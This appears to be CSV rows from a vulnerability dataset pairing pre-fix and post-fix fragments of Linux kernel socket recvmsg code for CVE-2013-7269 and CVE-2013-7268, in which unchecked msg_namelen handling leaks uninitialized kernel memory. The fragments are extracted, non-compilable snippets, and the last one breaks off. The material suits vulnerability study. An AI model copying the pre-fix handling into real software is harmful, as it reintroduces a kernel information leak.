			m->msg_name = address;
	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;



 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;
		msg->msg_namelen	= sizeof(*sipx);
	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);



	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);



 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;



 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;


	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;



	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;



 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif



	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);
		msg->msg_namelen = sizeof(*sax);
	}



 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);



 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;

 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /* You lose any data beyond the buffer you gave. If it worries
	 * a user program they can ask the device for its MTU
	 * anyway.











 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name) {
 /* If the address length field is there to be filled
		 * in, we fill it in now.
 */
 if (sock->type == SOCK_PACKET) {
			msg->msg_namelen = sizeof(struct sockaddr_pkt);
		} else {
 struct sockaddr_ll *sll = &PACKET_SKB_CB(skb)->sa.ll;
			msg->msg_namelen = sll->sll_halen +
 offsetof(struct sockaddr_ll, sll_addr);
		}
 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);
	}

 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);



 if (msg_flags & MSG_OOB)
 goto out;

"
2014,#NAME?,CVE-2013-7269," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;

	msg->msg_namelen = 0;

 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);
	msg->msg_namelen = 0;
 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;
 struct sockaddr_mISDN	*maddr;

 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_namelen >= sizeof(struct sockaddr_mISDN)) {
 msg->msg_namelen = sizeof(struct sockaddr_mISDN);
		maddr = (struct sockaddr_mISDN *)msg->msg_name;
		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
	} else {
 if (msg->msg_namelen)
 printk(KERN_WARNING ""%s: too small namelen %d\n"",
			       __func__, msg->msg_namelen);
		msg->msg_namelen = 0;
	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;

	m->msg_namelen = 0;

 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);








 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;
 struct sockaddr_at *sat = (struct sockaddr_at *)msg->msg_name;
 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err) {
 if (sat) {
			sat->sat_family      = AF_APPLETALK;
			sat->sat_port        = ddp->deh_sport;
			sat->sat_addr.s_node = ddp->deh_snode;
			sat->sat_addr.s_net  = ddp->deh_snet;
		}
		msg->msg_namelen = sizeof(*sat);
	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;

	msg->msg_namelen = 0;

 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_namelen != 0) {
 struct sockaddr_ax25 *sax = (struct sockaddr_ax25 *)msg->msg_name;
		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);


 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN) {
			msg->msg_namelen = 0;
 return 0;
		}
 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);
 else
			msg->msg_namelen = 0;
	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;

	msg->msg_namelen = 0;

 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);
		msg->msg_namelen = 0;
 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;
		msg->msg_namelen = 0;

 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;

	m->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;

	msg->msg_namelen = 0;

 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
		kern_msg->msg_name = kern_address;

	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
		m->msg_name = address;

	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;

	msg->msg_namelen = sizeof(*sipx);

 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;

	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);

	msg->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);

	msg->msg_namelen = 0;

 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;

	msg->msg_namelen = 0;

 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;

	msg->msg_namelen = 0;
	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;

	msg->msg_namelen = 0;

	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;

	msg->msg_namelen = 0;

 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif

	msg->msg_namelen = 0;

	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);

	}

	msg->msg_namelen = sizeof(*sax);

 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);

	msg->msg_namelen = 0;

 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;
 struct sockaddr_ll *sll;
 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /*
	 *	If the address length field is there to be filled in, we fill
	 *	it in now.
 */

	sll = &PACKET_SKB_CB(skb)->sa.ll;
 if (sock->type == SOCK_PACKET)
		msg->msg_namelen = sizeof(struct sockaddr_pkt);
 else
		msg->msg_namelen = sll->sll_halen + offsetof(struct sockaddr_ll, sll_addr);

 /*
	 *	You lose any data beyond the buffer you gave. If it worries a
	 *	user program they can ask the device for its MTU anyway.
 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name)










 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);


 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);

	msg->msg_namelen = 0;

 if (msg_flags & MSG_OOB)
 goto out;

"," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;



 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);

 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;


 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_name) {
 struct sockaddr_mISDN *maddr = msg->msg_name;

		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
		msg->msg_namelen = sizeof(*maddr);




	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;



 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);
 /* Notes for implementing recvmsg:
	 * ===============================
	 * msg->msg_namelen should get updated by the recvmsg handlers
	 * iff msg_name != NULL. It is by default 0 to prevent
	 * returning uninitialized memory to user space.  The recvfrom
	 * handlers can assume that msg.msg_name is either NULL or has
	 * a minimum size of sizeof(struct sockaddr_storage).
 */
 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;

 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err && msg->msg_name) {
 struct sockaddr_at *sat = msg->msg_name;
		sat->sat_family      = AF_APPLETALK;
		sat->sat_port        = ddp->deh_sport;
		sat->sat_addr.s_node = ddp->deh_snode;
		sat->sat_addr.s_net  = ddp->deh_snet;
		msg->msg_namelen     = sizeof(*sat);

	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;



 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_name) {

		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);
 struct sockaddr_ax25 *sax = msg->msg_name;

 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN)

 return 0;

 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);


	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;



 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);

 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;


 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;



	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;



 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
 if (kern_msg->msg_name)
			kern_msg->msg_name = kern_address;
	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
 if (m->msg_name)
			m->msg_name = address;
	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;



 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;
		msg->msg_namelen	= sizeof(*sipx);
	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);



	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);



 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;



 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;


	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;



	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;



 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif



	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);
		msg->msg_namelen = sizeof(*sax);
	}



 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);



 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;

 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /* You lose any data beyond the buffer you gave. If it worries
	 * a user program they can ask the device for its MTU
	 * anyway.











 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name) {
 /* If the address length field is there to be filled
		 * in, we fill it in now.
 */
 if (sock->type == SOCK_PACKET) {
			msg->msg_namelen = sizeof(struct sockaddr_pkt);
		} else {
 struct sockaddr_ll *sll = &PACKET_SKB_CB(skb)->sa.ll;
			msg->msg_namelen = sll->sll_halen +
 offsetof(struct sockaddr_ll, sll_addr);
		}
 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);
	}

 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);



 if (msg_flags & MSG_OOB)
 goto out;

"
2014,#NAME?,CVE-2013-7268," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;

	msg->msg_namelen = 0;

 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);
	msg->msg_namelen = 0;
 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;
 struct sockaddr_mISDN	*maddr;

 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_namelen >= sizeof(struct sockaddr_mISDN)) {
 msg->msg_namelen = sizeof(struct sockaddr_mISDN);
		maddr = (struct sockaddr_mISDN *)msg->msg_name;
		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
	} else {
 if (msg->msg_namelen)
 printk(KERN_WARNING ""%s: too small namelen %d\n"",
			       __func__, msg->msg_namelen);
		msg->msg_namelen = 0;
	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;

	m->msg_namelen = 0;

 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);








 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;
 struct sockaddr_at *sat = (struct sockaddr_at *)msg->msg_name;
 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err) {
 if (sat) {
			sat->sat_family      = AF_APPLETALK;
			sat->sat_port        = ddp->deh_sport;
			sat->sat_addr.s_node = ddp->deh_snode;
			sat->sat_addr.s_net  = ddp->deh_snet;
		}
		msg->msg_namelen = sizeof(*sat);
	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;

	msg->msg_namelen = 0;

 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_namelen != 0) {
 struct sockaddr_ax25 *sax = (struct sockaddr_ax25 *)msg->msg_name;
		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);


 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN) {
			msg->msg_namelen = 0;
 return 0;
		}
 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);
 else
			msg->msg_namelen = 0;
	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;

	msg->msg_namelen = 0;

 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);
		msg->msg_namelen = 0;
 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;
		msg->msg_namelen = 0;

 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;

	m->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;

	msg->msg_namelen = 0;

 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
		kern_msg->msg_name = kern_address;

	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
		m->msg_name = address;

	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;

	msg->msg_namelen = sizeof(*sipx);

 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;

	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);

	msg->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);

	msg->msg_namelen = 0;

 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;

	msg->msg_namelen = 0;

 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;

	msg->msg_namelen = 0;
	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;

	msg->msg_namelen = 0;

	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;

	msg->msg_namelen = 0;

 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif

	msg->msg_namelen = 0;

	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);

	}

	msg->msg_namelen = sizeof(*sax);

 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);

	msg->msg_namelen = 0;

 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;
 struct sockaddr_ll *sll;
 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /*
	 *	If the address length field is there to be filled in, we fill
	 *	it in now.
 */

	sll = &PACKET_SKB_CB(skb)->sa.ll;
 if (sock->type == SOCK_PACKET)
		msg->msg_namelen = sizeof(struct sockaddr_pkt);
 else
		msg->msg_namelen = sll->sll_halen + offsetof(struct sockaddr_ll, sll_addr);

 /*
	 *	You lose any data beyond the buffer you gave. If it worries a
	 *	user program they can ask the device for its MTU anyway.
 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name)










 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);


 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);

	msg->msg_namelen = 0;

 if (msg_flags & MSG_OOB)
 goto out;

"," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;



 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);

 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;


 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_name) {
 struct sockaddr_mISDN *maddr = msg->msg_name;

		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
		msg->msg_namelen = sizeof(*maddr);




	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;



 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);
 /* Notes for implementing recvmsg:
	 * ===============================
	 * msg->msg_namelen should get updated by the recvmsg handlers
	 * iff msg_name != NULL. It is by default 0 to prevent
	 * returning uninitialized memory to user space.  The recvfrom
	 * handlers can assume that msg.msg_name is either NULL or has
	 * a minimum size of sizeof(struct sockaddr_storage).
 */
 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;

 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err && msg->msg_name) {
 struct sockaddr_at *sat = msg->msg_name;
		sat->sat_family      = AF_APPLETALK;
		sat->sat_port        = ddp->deh_sport;
		sat->sat_addr.s_node = ddp->deh_snode;
		sat->sat_addr.s_net  = ddp->deh_snet;
		msg->msg_namelen     = sizeof(*sat);

	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;



 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_name) {

		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);
 struct sockaddr_ax25 *sax = msg->msg_name;

 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN)

 return 0;

 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);


	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;



 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;



	copied = skb->len;
 if (len < copied) {
